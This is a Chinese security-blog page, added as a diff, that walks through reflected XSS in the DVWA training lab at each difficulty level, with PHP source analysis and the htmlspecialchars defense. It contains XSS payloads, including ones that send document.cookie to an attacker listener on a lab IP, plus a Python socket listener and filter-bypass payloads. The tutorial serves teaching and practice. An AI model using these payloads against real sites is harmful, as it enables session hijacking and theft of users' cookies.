@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DVWA 靶场 Reflected XSS（跨站脚本攻击）全难度教程（附代码分析） - 信息安全实验室</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Titillium+Web:wght@400;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+<div class="scanline"></div>
+<div class="container">
+
+<div class="hero">
+  <h1>// BLOG : 信息安全实验室</h1>
+  <div class="subtitle">RHODES ISLAND <span>://</span> SECURITY <span>//</span> RESEARCH <span>//</span> EXPLOIT <span>//</span> DEFENSE</div>
+  <div class="tags-bar">
+    <a href="../index.html" class="tag tag-cyan">#首页</a>
+    <a href="../tags/list.html?tag=Web安全" class="tag tag-blue">#Web安全</a>
+    <a href="../tags/list.html?tag=DVWA" class="tag tag-cyan">#DVWA</a>
+    <a href="../tags/list.html?tag=XSS" class="tag tag-red">#XSS</a>
+  </div>
+  <div class="tagline">&gt; LOADING - 100% <span class="cursor">▌</span></div>
+</div>
+
+<div id="navSentinel"></div>
+
+<div class="nav-sticky-wrapper" id="navWrap">
+  <div class="nav-inner">
+    <a href="../index.html">首页</a>
+    <a href="../tags/list.html?tag=漏洞分析">漏洞分析</a>
+    <a href="../tags/list.html?tag=安全工具">安全工具</a>
+    <a href="../tags/list.html?tag=学习笔记">学习笔记</a>
+    <a href="../tags/list.html?tag=逆向">逆向</a>
+    <a href="../tags/list.html?tag=调试">调试</a>
+    <a href="../tags/list.html">标签归档</a>
+  </div>
+</div>
+
+<a href="../index.html" class="back-link">[ &larr; ] BACK TO HOME</a>
+
+<div class="post">
+  <div class="post-date">2024 // 05 / 18</div>
+  <div class="post-title">DVWA 靶场 Reflected Cross Site Scripting (XSS)（跨站脚本攻击）全难度教程（附代码分析）</div>
+  <div class="post-tags">
+    <span class="post-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">Web安全</span>
+    <span class="post-tag" style="background:#00d4ff22;color:#00d4ff;border:1px solid #00d4ff44">DVWA</span>
+    <span class="post-tag" style="background:#e4405f22;color:#e4405f;border:1px solid #e4405f44">XSS</span>
+  </div>
+</div>
+
+<div class="post-content" style="display:block;border:none;padding:0;margin:0;">
+
+<nav class="post-toc">
+  <span class="post-toc-title">// 目录</span>
+  <ul>
+    <li class="toc-h4"><a href="#xss-intro">XSS 简介</a></li>
+    <li class="toc-h4"><a href="#low">Low 难度</a>
+      <ul>
+        <li class="toc-h5"><a href="#low-code">代码分析</a></li>
+        <li class="toc-h5"><a href="#low-exploit">漏洞利用</a></li>
+      </ul>
+    </li>
+    <li class="toc-h4"><a href="#medium">Medium 难度</a>
+      <ul>
+        <li class="toc-h5"><a href="#medium-code">代码分析</a></li>
+        <li class="toc-h5"><a href="#medium-exploit">漏洞利用</a></li>
+      </ul>
+    </li>
+    <li class="toc-h4"><a href="#high">High 难度</a>
+      <ul>
+        <li class="toc-h5"><a href="#high-code">代码分析</a></li>
+        <li class="toc-h5"><a href="#high-exploit">漏洞利用</a></li>
+      </ul>
+    </li>
+    <li class="toc-h4"><a href="#impossible">Impossible 难度</a>
+      <ul>
+        <li class="toc-h5"><a href="#impossible-code">代码分析</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+<h4 id="xss-intro">XSS 简介</h4>
+
+<p>作为一种 HTML 注入攻击，XSS 攻击的核心思想就是在 HTML 页面中注入恶意代码，代码语言是 JS。一般有三个角色参与：攻击者、目标服务器、受害者的浏览器。</p>
+
+<h4 id="low">Low 难度</h4>
+
+<h5 id="low-code">代码分析</h5>
+
+<pre><code>&lt;?php
+
+// Is there any input?
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+    // Feedback for end user
+    echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;';
+}
+
+?&gt;</code></pre>
+
+<p>没有任何过滤，直接 payload 即可。</p>
+
+<h5 id="low-exploit">漏洞利用</h5>
+
+<p>POC：</p>
+
+<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+
+<p><img src="../assets/xss_image001.png" alt="" style="max-width:100%"></p>
+
+<p>获取 Cookie：</p>
+
+<pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
+
+<p><img src="../assets/xss_image002.png" alt="" style="max-width:100%"></p>
+
+<p>需要将此转到本机上，Python 脚本：</p>
+
+<pre><code>import socket
+
+HOST = '本机IP地址'
+PORT = 2022
+server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server_socket.bind((HOST, PORT))
+server_socket.listen(1)
+print('等待客户端连接...')
+
+client_socket, addr = server_socket.accept()
+print('客户端已连接：', addr)
+
+data = client_socket.recv(1024)
+print('接收到数据：', data.decode())
+client_socket.sendall(data)
+client_socket.close()
+server_socket.close()</code></pre>
+
+<pre><code>&lt;img src="http://192.168.21.180:2022/1.php?url="+encodeURIComponent(document.location.href)+"&amp;cookie="+encodeURIComponent(document.cookie) /&gt;</code></pre>
+
+<p><img src="../assets/xss_image003.png" alt="" style="max-width:100%"></p>
+
+<h4 id="medium">Medium 难度</h4>
+
+<h5 id="medium-code">代码分析</h5>
+
+<pre><code>&lt;?php
+
+header ("X-XSS-Protection: 0");
+
+// Is there any input?
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+    // Get input
+    $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] );
+
+    // Feedback for end user
+    echo "&lt;pre&gt;Hello {$name}&lt;/pre&gt;";
+}
+
+?&gt;</code></pre>
+
+<p>查看源代码，发现对 <code>&lt;script&gt;</code> 有一个替换，但是没有过滤大小写，大小写绕过即可。</p>
+
+<h5 id="medium-exploit">漏洞利用</h5>
+
+<pre><code>http://192.168.21.128/dvwa/vulnerabilities/xss_r/?name=%3Cs%3Cscript%3Ecript%3Edocument.write%28%27%3Cimg+src%3D%22http%3A%2F%2F192.168.21.1%3A2022%2F%27%2Bdocument.cookie%2B%27%22%2F%3E%27%29%3C%2Fscript%3E#</code></pre>
+
+<p><img src="../assets/xss_image004.png" alt="" style="max-width:100%"></p>
+
+<h4 id="high">High 难度</h4>
+
+<h5 id="high-code">代码分析</h5>
+
+<pre><code>&lt;?php
+
+header ("X-XSS-Protection: 0");
+
+// Is there any input?
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+    // Get input
+    $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
+
+    // Feedback for end user
+    echo "&lt;pre&gt;Hello {$name}&lt;/pre&gt;";
+}
+
+?&gt;</code></pre>
+
+<p>禁用了 <code>script</code>，但可以使用别的标签。</p>
+
+<h5 id="high-exploit">漏洞利用</h5>
+
+<pre><code>http://192.168.21.128/dvwa/vulnerabilities/xss_r/?name=%3Cimg+src+%3D+1+onerror+%3D+alert%281%29%3E#</code></pre>
+
+<p><img src="../assets/xss_image005.png" alt="" style="max-width:100%"></p>
+
+<h4 id="impossible">Impossible 难度</h4>
+
+<h5 id="impossible-code">代码分析</h5>
+
+<pre><code>&lt;?php
+
+// Is there any input?
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Get input
+    $name = htmlspecialchars( $_GET[ 'name' ] );
+
+    // Feedback for end user
+    echo "&lt;pre&gt;Hello {$name}&lt;/pre&gt;";
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;</code></pre>
+
+<p>使用 <code>htmlspecialchars()</code> 将 HTML 特殊字符转成实体，从根本上防御了 XSS 注入。</p>
+
+</div>
+
+<div class="footer">
+  <div class="brand">RHODES ISLAND <span>://</span> SECURITY LAB <span>//</span> BLOG</div>
+  <div class="motto">&gt; 保持好奇 · 保持怀疑 · 保持学习</div>
+  <div class="links">
+    <a href="https://github.com/himobrine/wiki">GitHub</a>
+    <a href="../links.html">友情链接</a>
+    <a href="../index.html">Home</a>
+  </div>
+  <div class="copy">(c) 2026 // SECURITY BLOG</div>
+</div>
+
+</div>
+
+<div class="floating-buttons">
+  <button class="float-btn" id="themeToggle" title="切换主题" aria-label="切换主题">☽</button>
+  <button class="float-btn" id="backToTop" title="回到顶部" aria-label="回到顶部">⌃</button>
+</div>
+
+<script>
+const html = document.documentElement;
+const themeBtn = document.getElementById('themeToggle');
+const saved = localStorage.getItem('theme') || 'dark';
+html.setAttribute('data-theme', saved);
+themeBtn.textContent = saved === 'dark' ? '☽' : '☀';
+themeBtn.addEventListener('click', () => {
+  const cur = html.getAttribute('data-theme');
+  const next = cur === 'dark' ? 'light' : 'dark';
+  html.setAttribute('data-theme', next);
+  localStorage.setItem('theme', next);
+  themeBtn.textContent = next === 'dark' ? '☽' : '☀';
+});
+const topBtn = document.getElementById('backToTop');
+topBtn.addEventListener('click', () => window.scrollTo({ top: 0, behavior: 'smooth' }));
+window.addEventListener('scroll', () => topBtn.classList.toggle('show', window.scrollY > 300), { passive: true });
+
+/* sticky nav */
+const navSentinel = document.getElementById('navSentinel');
+const navWrap = document.getElementById('navWrap');
+let navSpacer = null;
+const navObs = new IntersectionObserver(([e]) => {
+  const stuck = !e.isIntersecting;
+  navWrap.classList.toggle('fixed', stuck);
+  if (stuck && !navSpacer) {
+    navSpacer = document.createElement('div');
+    navSpacer.style.height = navWrap.offsetHeight + 'px';
+    navWrap.parentNode.insertBefore(navSpacer, navWrap.nextSibling);
+  } else if (!stuck && navSpacer) {
+    navSpacer.remove(); navSpacer = null;
+  }
+}, { threshold: [0] });
+navObs.observe(navSentinel);
+
+/* TOC active highlight */
+const tocLinks = document.querySelectorAll('.post-toc a');
+const tocTargets = [];
+tocLinks.forEach(a => {
+  const id = a.getAttribute('href').slice(1);
+  const el = document.getElementById(id);
+  if (el) tocTargets.push({ el, link: a });
+});
+const tocObs = new IntersectionObserver(
+  (entries) => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const match = tocTargets.find(t => t.el === e.target);
+        if (match) match.link.classList.add('active');
+      }
+    });
+  },
+  { threshold: 0.3, rootMargin: '-80px 0px -40% 0px' }
+);
+tocTargets.forEach(t => tocObs.observe(t.el));
+
+/* code block header bar */
+document.querySelectorAll('.post-content pre').forEach(pre => {
+  const wrap = document.createElement('div');
+  wrap.className = 'code-wrapper';
+  pre.parentNode.insertBefore(wrap, pre);
+  wrap.appendChild(pre);
+
+  const lines = pre.textContent.split('\n').length;
+
+  const header = document.createElement('div');
+  header.className = 'code-header';
+
+  const info = document.createElement('span');
+  info.className = 'code-header-info';
+  info.textContent = `CODE // ${lines} line${lines === 1 ? '' : 's'}`;
+
+  const actions = document.createElement('div');
+  actions.className = 'code-header-actions';
+
+  const copy = document.createElement('button');
+  copy.className = 'code-btn code-btn-copy'; copy.textContent = 'copy';
+  copy.onclick = (e) => {
+    e.stopPropagation();
+    navigator.clipboard.writeText(pre.textContent).then(() => {
+      copy.textContent = 'copied!'; copy.classList.add('copied');
+      setTimeout(() => { copy.textContent = 'copy'; copy.classList.remove('copied'); }, 1500);
+    });
+  };
+
+  const fold = document.createElement('button');
+  fold.className = 'code-btn code-btn-fold'; fold.textContent = '\u2191';
+  fold.onclick = (e) => {
+    e.stopPropagation();
+    wrap.classList.toggle('collapsed');
+    fold.textContent = wrap.classList.contains('collapsed') ? '\u2193' : '\u2191';
+  };
+  wrap.onclick = () => {
+    if (wrap.classList.contains('collapsed')) {
+      wrap.classList.remove('collapsed');
+      fold.textContent = '\u2191';
+    }
+  };
+
+  if (lines > 10) { wrap.classList.add('collapsed'); fold.textContent = '\u2193'; }
+
+  actions.append(copy, fold);
+  header.append(info, actions);
+  wrap.prepend(header);
+});
+</script>
+
+</body>
+</html>
